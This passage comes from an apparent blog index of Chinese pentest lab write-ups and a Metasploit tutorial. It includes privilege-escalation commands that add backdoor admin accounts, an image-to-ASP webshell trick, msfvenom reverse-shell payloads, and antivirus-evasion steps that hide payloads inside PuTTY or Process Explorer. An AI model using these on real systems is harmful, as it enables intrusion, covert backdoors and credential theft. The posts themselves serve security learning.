src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200819113744.png\" alt=\"\"></p>\n<p>使用pr.exe执行命令，<code>PR.exe &quot;net user blacknight 123456 /add&quot;</code>添加用户</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200819115243.png\" alt=\"\"></p>\n<p>给添加的用户赋予管理员权限，<code>PR.exe &quot;net localgroup Administrators blacknight /add&quot;</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200819115251.png\" alt=\"\"></p>\n<p>然后尝试开启远程登录权限，上传3389批处理文件</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200819120513.png\" alt=\"\"></p>\n<p>再pr运行3389.exe</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200819120655.png\" alt=\"\"></p>\n<p>现在尝试cmd运行mstsc启动远程连接程序，ipconfig查看靶机地址，连接成功，输入刚才创建的用户名密码登录</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200819120859.png\" alt=\"\"></p>\n<p>那么现在获取本地哈希了，工具cain可以获取本地hash并支持爆破，首先找个目录上传</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200819121046.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200819121353.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200819121411.png\" alt=\"\"></p>\n<p>安装之后打开，注意这里要选不受限的方式</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200819121629.png\" alt=\"\"></p>\n<p>再获取本地密码哈希</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200819121728.png\" alt=\"\"></p>\n<p>右键导出即可看到各个用户的密码哈希</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200819121915.png\" alt=\"\"></p>\n<p>把administrator的哈希放到在线网站破解即可（”:”后面的数值）</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200819122225.png\" alt=\"\"></p>\n<p>完成</p>\n<h3 id=\"网站综合渗透实验\"><a href=\"#网站综合渗透实验\" class=\"headerlink\" title=\"网站综合渗透实验\"></a>网站综合渗透实验</h3><p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920154337.png\" alt=\"\"></p>\n<p>扫一波后台，发现admin</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920154611.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920154704.png\" alt=\"\"></p>\n<p>告诉我们管理员用户名是linhai，但是有验证码，抓包看看验证码是什么逻辑</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920155259.png\" alt=\"\"></p>\n<p>看到s和s2想到可以爆破，但提示信息啥的全都乱码，爆破了一下也没什么结果，换个思路吧</p>\n<p>点了几下发现asp有挺多参数，用旁注检测下</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920161346.png\" alt=\"\"></p>\n<p>那么随便点一个跑一下，得到用户名和密码的hash</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920161503.png\" alt=\"\"></p>\n<p>pmd5查一下，得到密码</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920161653.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920161950.png\" alt=\"\"></p>\n<p>看第二题</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920162020.png\" alt=\"\"></p>\n<p>在后台找找有没有上传什么的</p>\n<p>首先是添加图片</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920165908.png\" alt=\"\"></p>\n<p>上传之后啥也没有，回到首页也没找到上传的图片，同样的下面几项也没什么变化，继续翻</p>\n<p>找到了添加文件，试着写入一句话看看</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920170301.png\" alt=\"\"></p>\n<p>查看源码发现已经被转义了，失败</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920170430.png\" alt=\"\"></p>\n<p>来到系统信息，logo处还有一个上传</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920170630.png\" alt=\"\"></p>\n<p>可以上传，并且点击生成代码还给出了上传信息，有戏</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920170736.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920170757.png\" alt=\"\"></p>\n<p>那么现在就是怎么把这个图片解析成asp的问题了，我们注意到下面还有个数据库备份功能</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920170924.png\" alt=\"\"></p>\n<p>假如我们把数据库路径改成我们的图片马，是不是就可以转换成asp保存下来了呢，用刚才的路径试一下</p>\n<p>默认给出的路径是../db，也就是admin目录下，那么我们只要把数据库路径改成upfiles/202092077303.jpg，备份地址改成upfiles/202092077303.asp即可</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920173240.png\" alt=\"\"></p>\n<p>访问下upfiles/202092077303.asp，已经成功转换为asp了</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920173403.png\" alt=\"\"></p>\n<p>那么做个图片马上传再同样操作即可</p>\n<p>这里制作图片马的时候遇到了点麻烦，一开始用copy命令或者直接文本打开图片加上一句话木马转换之后报错</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920184544.png\" alt=\"\"></p>\n<p>猜想可能是jpg备份成asp出了啥问题，所以改下，直接创建一个1.jpg，直接写一句话传不上去，把一句话尽可能写多一点</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920185639.png\" alt=\"\"></p>\n<p>这下解析了，菜刀连接即可</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920185714.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920185728.png\" alt=\"\"></p>\n<p>成功getshell，那么第三题</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920185805.png\" alt=\"\"></p>\n<p>数据库文件一般都要conn*什么的，找一下</p>\n<p>最后在wwwroot下的conn_old.asp里找到密码linhai123456woaini</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920190138.png\" alt=\"\"></p>\n<p>最后一题</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920190802.png\" alt=\"\"></p>\n<p>可以看到权限非常低</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920190934.png\" alt=\"\"></p>\n<p>这个命令行不让用，我们上传一个cmd.exe试试，那么首先需要找到有上传权限的目录</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920191442.png\" alt=\"\"></p>\n<p>右键cmd.exe打开虚拟终端</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920191518.png\" alt=\"\"></p>\n<p>现在有终端了，systeminfo查看下系统信息</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920191720.png\" alt=\"\"></p>\n<p>电脑版本是win server 2003 sp2，并且只打了一个补丁</p>\n<p>在<a href=\"https://bugs.hacking8.com/\" target=\"_blank\" rel=\"noopener\">提权辅助工具</a>，输入补丁信息</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920191946.png\" alt=\"\"></p>\n<p>找到如下信息，因为补丁打的太少，可能的exp太多，其中包括wp中其他师傅写的MS09-012</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920193801.png\" alt=\"\"></p>\n<p>直接跟着MS09-012的来了</p>\n<p>目录下再次上传Churrasco.exe和3389.bat</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920195929.png\" alt=\"\"></p>\n<p>用Churrasco.exe添加账户</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Churrasco.exe &quot;net user blacknight 123456 &#x2F;add&quot;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920200148.png\" alt=\"\"></p>\n<p>将新增的账户添加到管理员组</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Churrasco.exe &quot;net localgroup administrators blacknight &#x2F;add&quot;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920200413.png\" alt=\"\"></p>\n<p>现在有个账户，那么尝试远程登录，先开启3389</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Churrasco.exe 3389.bat</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920200746.png\" alt=\"\"></p>\n<p>ipconfig查看本机ip地址</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920200855.png\" alt=\"\"></p>\n<p>本机cmd运行mstsc远程连接，用刚才创建的账户登录</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920200930.png\" alt=\"\">)<img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920200958.png\" alt=\"\"></p>\n<p>那么现在获取管理员hash即可，同样可以使用工具cain，过程和上个实验一样，做到这实验环境崩了，就这样吧。</p>\n","categories":["ichunqiu综合渗透练习"]},{"title":"metasploit免杀技巧","url":"/2020/07/28/msf_note5/","content":"<h3 id=\"msf生成可独立运行二进制文件\"><a href=\"#msf生成可独立运行二进制文件\" class=\"headerlink\" title=\"msf生成可独立运行二进制文件\"></a>msf生成可独立运行二进制文件</h3><p>以windows可执行文件为例，执行</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">msfvenom -p windows&#x2F;shell_reverse_tcp LHOST&#x3D;192.168.48.128 LPORT&#x3D;8080 -f exe -o payload.exe</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200728101445.png\" alt=\"\"></p>\n<p>这样就生成了一个windows上可执行的反弹shell程序，然后可以使用<strong>multi/handler</strong>模块在MSF终端启动一个监听器，对反弹连接进行监听和处理。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200728104422.png\" alt=\"\"></p>\n<p>之后在windows上运行exe文件即可建立会话</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200728104521.png\" alt=\"\"></p>\n<h3 id=\"躲避杀毒软件检测\"><a href=\"#躲避杀毒软件检测\" class=\"headerlink\" title=\"躲避杀毒软件检测\"></a>躲避杀毒软件检测</h3><h4 id=\"使用msf编码器\"><a href=\"#使用msf编码器\" class=\"headerlink\" title=\"使用msf编码器\"></a>使用msf编码器</h4><p>MSF编码器将原始的可执行程序重新编码，并生成一个新的二进制文件，当这个文件运行后，MSF编码器会将原始程序解码到内存中执行</p>\n<p>使用<code>msfvenom -l encoders</code>列出所有可用的编码格式，可以看到除了名称和描述外，msf还给每个编码器评定了等级（注意不同的编码格式适用于不同的操作系统平台）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">root@kali:&#x2F;opt# msfvenom -l encoders</span><br><span class=\"line\"></span><br><span class=\"line\">Framework Encoders [--encoder &lt;value&gt;]</span><br><span class=\"line\">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class=\"line\"></span><br><span class=\"line\">    Name                          Rank       Description</span><br><span class=\"line\">    ----                          ----       -----------</span><br><span class=\"line\">    cmd&#x2F;brace                     low        Bash Brace Expansion Command Encoder</span><br><span class=\"line\">    cmd&#x2F;echo                      good       Echo Command Encoder</span><br><span class=\"line\">    cmd&#x2F;generic_sh                manual     Generic Shell Variable Substitution Command Encoder</span><br><span class=\"line\">    cmd&#x2F;ifs                       low        Bourne $&#123;IFS&#125; Substitution Command Encoder</span><br><span class=\"line\">    cmd&#x2F;perl                      normal     Perl Command Encoder</span><br><span class=\"line\">    cmd&#x2F;powershell_base64         excellent  Powershell Base64 Command Encoder</span><br><span class=\"line\">    cmd&#x2F;printf_php_mq             manual     printf(1) via PHP magic_quotes Utility Command Encoder</span><br><span class=\"line\">    generic&#x2F;eicar                 manual     The EICAR Encoder</span><br><span class=\"line\">    generic&#x2F;none                  normal     The &quot;none&quot; Encoder</span><br><span class=\"line\">    mipsbe&#x2F;byte_xori              normal     Byte XORi Encoder</span><br><span class=\"line\">    mipsbe&#x2F;longxor                normal     XOR Encoder</span><br><span class=\"line\">    mipsle&#x2F;byte_xori              normal     Byte XORi Encoder</span><br><span class=\"line\">    mipsle&#x2F;longxor                normal     XOR Encoder</span><br><span class=\"line\">    php&#x2F;base64                    great      PHP Base64 Encoder</span><br><span class=\"line\">    ppc&#x2F;longxor                   normal     PPC LongXOR Encoder</span><br><span class=\"line\">    ppc&#x2F;longxor_tag               normal     PPC LongXOR Encoder</span><br><span class=\"line\">    ruby&#x2F;base64                   great      Ruby Base64 Encoder</span><br><span class=\"line\">    sparc&#x2F;longxor_tag             normal     SPARC DWORD XOR Encoder</span><br><span class=\"line\">    x64&#x2F;xor                       normal     XOR Encoder</span><br><span class=\"line\">    x64&#x2F;xor_context               normal     Hostname-based Context Keyed Payload Encoder</span><br><span class=\"line\">    x64&#x2F;xor_dynamic               normal     Dynamic key XOR Encoder</span><br><span class=\"line\">    x64&#x2F;zutto_dekiru              manual     Zutto Dekiru</span><br><span class=\"line\">    x86&#x2F;add_sub                   manual     Add&#x2F;Sub Encoder</span><br><span class=\"line\">    x86&#x2F;alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder</span><br><span class=\"line\">    x86&#x2F;alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder</span><br><span class=\"line\">    x86&#x2F;avoid_underscore_tolower  manual     Avoid underscore&#x2F;tolower</span><br><span class=\"line\">    x86&#x2F;avoid_utf8_tolower        manual     Avoid UTF8&#x2F;tolower</span><br><span class=\"line\">    x86&#x2F;bloxor                    manual     BloXor - A Metamorphic Block Based XOR Encoder</span><br><span class=\"line\">    x86&#x2F;bmp_polyglot              manual     BMP Polyglot</span><br><span class=\"line\">    x86&#x2F;call4_dword_xor           normal     Call+4 Dword XOR Encoder</span><br><span class=\"line\">    x86&#x2F;context_cpuid             manual     CPUID-based Context Keyed Payload Encoder</span><br><span class=\"line\">    x86&#x2F;context_stat              manual     stat(2)-based Context Keyed Payload Encoder</span><br><span class=\"line\">    x86&#x2F;context_time              manual     time(2)-based Context Keyed Payload Encoder</span><br><span class=\"line\">    x86&#x2F;countdown                 normal     Single-byte XOR Countdown Encoder</span><br><span class=\"line\">    x86&#x2F;fnstenv_mov               normal     Variable-length Fnstenv&#x2F;mov Dword XOR Encoder</span><br><span class=\"line\">    x86&#x2F;jmp_call_additive         normal     Jump&#x2F;Call XOR Additive Feedback Encoder</span><br><span class=\"line\">    x86&#x2F;nonalpha                  low        Non-Alpha Encoder</span><br><span class=\"line\">    x86&#x2F;nonupper                  low        Non-Upper Encoder</span><br><span class=\"line\">    x86&#x2F;opt_sub                   manual     Sub Encoder (optimised)</span><br><span class=\"line\">    x86&#x2F;service                   manual     Register Service</span><br><span class=\"line\">    x86&#x2F;shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder</span><br><span class=\"line\">    x86&#x2F;single_static_bit         manual     Single Static Bit</span><br><span class=\"line\">    x86&#x2F;unicode_mixed             manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder</span><br><span class=\"line\">    x86&#x2F;unicode_upper             manual     Alpha2 Alphanumeric Unicode Uppercase Encoder</span><br><span class=\"line\">    x86&#x2F;xor_dynamic               normal     Dynamic key XOR Encoder</span><br></pre></td></tr></table></figure>\n\n<p>生成攻击载荷时使用<code>-e</code>指定使用编码器</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200728110342.png\" alt=\"\"></p>\n<h4 id=\"多重编码\"><a href=\"#多重编码\" class=\"headerlink\" title=\"多重编码\"></a>多重编码</h4><p>MSF允许对攻击载荷文件进行多次编码，以降低被杀毒软件检测的风险</p>\n<p>示例：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">root@kali:&#x2F;opt# msfvenom -p windows&#x2F;shell_reverse_tcp LHOST&#x3D;192.168.48.128 LPORT&#x3D;8080 -e x86&#x2F;shikata_ga_nai -i 10 -f raw|msfvenom -e x86&#x2F;alpha_upper -a x86 --platform windows -i 5 -f raw|msfvenom -e x86&#x2F;shikata_ga_nai -a x86 --platform windows -i 10 -f raw|msfvenom -e x86&#x2F;countdown -a x86 --platform windows -i 10 -f exe -o payload.exe</span><br><span class=\"line\">Attempting to read payload from STDIN...Attempting to read payload from STDIN...</span><br><span class=\"line\">Attempting to read payload from STDIN...</span><br><span class=\"line\"></span><br><span class=\"line\">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class=\"line\">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class=\"line\">Found 1 compatible encoders</span><br><span class=\"line\">Attempting to encode payload with 10 iterations of x86&#x2F;shikata_ga_nai</span><br><span class=\"line\">x86&#x2F;shikata_ga_nai succeeded with size 351 (iteration&#x3D;0)</span><br><span class=\"line\">...</span><br><span class=\"line\">x86&#x2F;shikata_ga_nai succeeded with size 594 (iteration&#x3D;9)</span><br><span class=\"line\">x86&#x2F;shikata_ga_nai chosen with final size 594</span><br><span class=\"line\">Payload size: 594 bytes</span><br><span class=\"line\"></span><br><span class=\"line\">Found 1 compatible encoders</span><br><span class=\"line\">Attempting to encode payload with 5 iterations of x86&#x2F;alpha_upper</span><br><span class=\"line\">x86&#x2F;alpha_upper succeeded with size 1255 (iteration&#x3D;0)</span><br><span class=\"line\">...</span><br><span class=\"line\">x86&#x2F;alpha_upper succeeded with size 21115 (iteration&#x3D;4)</span><br><span class=\"line\">x86&#x2F;alpha_upper chosen with final size 21115</span><br><span class=\"line\">Payload size: 21115 bytes</span><br><span class=\"line\"></span><br><span class=\"line\">Found 1 compatible encoders</span><br><span class=\"line\">Attempting to encode payload with 10 iterations of x86&#x2F;shikata_ga_nai</span><br><span class=\"line\">x86&#x2F;shikata_ga_nai succeeded with size 21144 (iteration&#x3D;0)</span><br><span class=\"line\">...</span><br><span class=\"line\">x86&#x2F;shikata_ga_nai succeeded with size 21405 (iteration&#x3D;9)</span><br><span class=\"line\">x86&#x2F;shikata_ga_nai chosen with final size 21405</span><br><span class=\"line\">Payload size: 21405 bytes</span><br><span class=\"line\">Found 1 compatible encoders</span><br><span class=\"line\">Attempting to encode payload with 10 iterations of x86&#x2F;countdown</span><br><span class=\"line\">x86&#x2F;countdown succeeded with size 21423 (iteration&#x3D;0)</span><br><span class=\"line\">...</span><br><span class=\"line\">x86&#x2F;countdown succeeded with size 21585 (iteration&#x3D;9)</span><br><span class=\"line\">x86&#x2F;countdown chosen with final size 21585</span><br><span class=\"line\">Payload size: 21585 bytes</span><br><span class=\"line\">Final size of exe file: 73802 bytes</span><br><span class=\"line\">Saved as: payload.exe</span><br><span class=\"line\">root@kali:&#x2F;opt#</span><br></pre></td></tr></table></figure>\n\n<p>这里我们先使用了10次<strong>shikata_ga_na</strong>i编码，将编码后的原始数据又进行了5次<strong>alpha_upper</strong>编码，然后再进行10次<strong>shika_ga_nai</strong>编码，接着进行10次<strong>countdown</strong>编码，最后生成可执行文件。</p>\n<h4 id=\"自定义可执行文件模板\"><a href=\"#自定义可执行文件模板\" class=\"headerlink\" title=\"自定义可执行文件模板\"></a>自定义可执行文件模板</h4><p>通常情况下执行<strong>msfvenom</strong>命令时，攻击载荷将被嵌入到位于data/templates/template.exe的默认的可执行文件模板中，虽然这个模板文件会更新，但它永远是杀毒软件的重点关注对象</p>\n<p>当前的<strong>msfvenom</strong>支持使用<strong>-x</strong>选项使用任意的windows可执行程序来代替默认模板文件，下面的例子中我们可以重新对攻击载荷进行编码，并将微软Sysinternals套件中的Process Explorer程序作为自定义的可执行程序模块</p>\n<p>首先从Microsoft网站下载Process Explorer软件并解压</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">wget http:&#x2F;&#x2F;download.sysinternals.com&#x2F;files&#x2F;ProcessExplorer.zip</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200728113424.png\" alt=\"\"></p>\n<p>接着指定模板文件生成攻击载荷，这样就可以得到自定义模板的可执行程序</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200728113626.png\" alt=\"\"></p>\n<h4 id=\"隐秘的启动一个攻击载荷\"><a href=\"#隐秘的启动一个攻击载荷\" class=\"headerlink\" title=\"隐秘的启动一个攻击载荷\"></a>隐秘的启动一个攻击载荷</h4><p>如果用户运行了你的后门执行文件但却什么都没发生，很容易就会引起怀疑，为了避免被目标察觉，可以在启动攻击载荷的同时，让宿主程序也正常的运行起来</p>\n<p>MSF中使用选项-k会配置攻击载荷在一个独立线程中启动，这样宿主程序在执行时不会收到影响。</p>\n<p>以ssh客户端Putty为例</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200728120024.png\" alt=\"\"></p>\n<p>在msf建立监听，靶机执行文件试试效果</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200728120324.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200728120427.png\" alt=\"\"></p>\n<p>可以看到成功打开了shell，而且用户软件可以正常显示和使用。</p>\n<h4 id=\"加壳软件\"><a href=\"#加壳软件\" class=\"headerlink\" title=\"加壳软件\"></a>加壳软件</h4><p>加壳软件是一种能够对可执行文件进行加密压缩并将压缩代码嵌入其中的工具，当加过壳的文件被执行后，解压代码会从已压缩的数据中重建原始程序并运行。这些过程对用户是透明的，所以加壳后的程序可以代替原始程序使用。</p>\n<p>下面使用UPX加壳软件对我们的攻击载荷文件进行编码和压缩，以尝试对该文件进行免杀处理</p>\n<p>执行<code>upx</code>命令查看它支持哪些选项</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200728121123.png\" alt=\"\"></p>\n<p>使用<strong>-5</strong>选项对我们的可执行文件进行压缩并加壳</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200728121426.png\" alt=\"\"></p>\n<p>可以看见upx将我们的原始攻击文件体积进行了压缩，这样加壳过后的文件就可以一定程度上降低被杀毒软件检测的风险。</p>\n","categories":["渗透测试"],"tags":["metasploit"]},{"title":"i春秋刷题——Exploit-Exercises:Nebula","url":"/2020/08/12/ichunqiu_attackpractice/","content":"<p>平台：<a href=\"https://www.ichunqiu.com/\" target=\"_blank\" rel=\"noopener\">https://www.ichunqiu.com/</a></p>\n<h3 id=\"level00\"><a href=\"#level00\" class=\"headerlink\" title=\"level00\"></a>level00</h3><p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200811112301.png\" alt=\"\"></p>\n<p>靶机地址，用户名和密码xshell登录</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200811112557.png\" alt=\"\"></p>\n<p>首先找特权程序，特权程序即set-uid(SUID)，它是控制文件访问的权限标志，允许用户以可执行文件的 owner 或 owner group 的权限运行可执行文件，当 s 出现在文件拥有者的 x 权限上时，就被称为 SETUID BITS 或 SETUID（<a href=\"https://www.cnblogs.com/sparkdev/p/9651622.html\" target=\"_blank\" rel=\"noopener\">Linux 特殊权限 SUID,SGID,SBIT</a>）</p>\n<p>使用命令：<code>find / -perm -4000 2&gt; /dev/null | xrags ls -lh</code>，忽略错误信息输出所有拥有SUID权限的文件</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200811122631.png\" alt=\"\"></p>\n<p>进入第一个文件路径下执行flag00提权，拿到flag</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200811130506.png\" alt=\"\"></p>\n<h3 id=\"level01\"><a href=\"#level01\" class=\"headerlink\" title=\"level01\"></a>level01</h3><p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200811130710.png\" alt=\"\"></p>\n<p>执行flag文件并追踪命令执行过程</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200811132017.png\" alt=\"\"></p>\n<p>可以看到调用了system命令，但这里的echo是通过env定位找到的，如果我们让env优先定位到我们伪造的echo，再将echo执行的是我们想要的东西，就能getflag</p>\n<p>首先添加环境变量</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200811133437.png\" alt=\"\"></p>\n<p>执行<code>ln -s /bin/getflag /home/level01/echo</code>，创建一个链接到了getflag的echo</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200811133834.png\" alt=\"\"></p>\n<p>这样，在执行./flag之后，env寻找echo时会先找到/home/level01处的echo，而此处的echo执行的是/bin/getflag</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200811134251.png\" alt=\"\"></p>\n<p>确认行的通之后创建一个新的echo内容为<code>cat /home/flag01/flag</code>，回到./flag01目录执行即可</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200811135956.png\" alt=\"\"></p>\n<p>ps：这里的echo要给权限</p>\n<h3 id=\"level02\"><a href=\"#level02\" class=\"headerlink\" title=\"level02\"></a>level02</h3><p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200811144418.png\" alt=\"\"></p>\n<p>执行flag02</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200811144348.png\" alt=\"\"></p>\n<p>查看调用过程可以看到是获取了环境变量的user</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200811144835.png\" alt=\"\"></p>\n<p>直接修改环境变量中的USER使得读取flag文件即可</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200811145118.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200811145145.png\" alt=\"\"></p>\n<h3 id=\"level03\"><a href=\"#level03\" class=\"headerlink\" title=\"level03\"></a>level03</h3><p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200811145817.png\" alt=\"\"></p>\n<p>flag文件夹里有个脚本</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200811145753.png\" alt=\"\"></p>\n<p>会执行writable.d中的脚本并删除，那么我们在writeable.d中创建一个文件，写上我们的命令即可，别忘了赋权限</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200811154044.png\" alt=\"\"></p>\n<h3 id=\"level04\"><a href=\"#level04\" class=\"headerlink\" title=\"level04\"></a>level04</h3><p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200811155801.png\" alt=\"\"></p>\n<p>flag目录下有个token文件</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200811160003.png\" alt=\"\"></p>\n<p>flag04可以直接读文件，但token读不了</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200811160631.png\" alt=\"\"></p>\n<p>看下执行过程</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200811160720.png\" alt=\"\"></p>\n<p>有一个strstr函数，禁止我们读的文件名中有token字符串，那我们可以创建一个软链接指向token，间接的读取token</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200811161555.png\" alt=\"\"></p>\n<p>然后用token作为密码登录flag04用户即可getflag</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200811161725.png\" alt=\"\"></p>\n<h3 id=\"level05\"><a href=\"#level05\" class=\"headerlink\" title=\"level05\"></a>level05</h3><p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200812091110.png\" alt=\"\"></p>\n<p>进入flag文件只有一个flag但有挺多隐藏文件</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200812091507.png\" alt=\"\"></p>\n<p>backup目录里有个tgz包，权限不足解压到tmp目录下，直接给了私钥</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200812092012.png\" alt=\"\"></p>\n<p>那么直接私钥登录flag05就行</p>\n<p><img 